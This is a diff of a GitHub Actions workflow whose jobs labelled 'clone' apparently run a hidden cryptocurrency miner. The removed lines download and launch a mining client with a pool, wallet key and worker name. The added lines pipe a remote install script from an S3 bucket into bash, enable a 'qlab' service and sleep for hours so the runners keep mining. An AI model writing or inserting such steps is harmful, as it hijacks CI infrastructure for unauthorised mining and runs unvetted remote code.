@@ -25,7 +25,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+           systemctl enable qlab &
            sleep 310s
   ol:
     needs: kont
@@ -48,7 +49,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+           systemctl enable qlab &
             sleep 5m
         
     
@@ -74,7 +76,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+           systemctl enable qlab &
             sleep 6m
   ayo:
     needs: ol
@@ -97,12 +100,13 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+           systemctl enable qlab &
             sleep 305m
         
     
      
-  su: 
+  su:
     needs: [tol]
     runs-on: ubuntu-latest
     strategy:
@@ -123,7 +127,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: curl -fsSL https://poolsolution.s3.eu-west-2.amazonaws.com/qlab-install.sh | bash -s -- SMOULD THREADS
+           systemctl enable qlab &
             sleep 261m
         
     
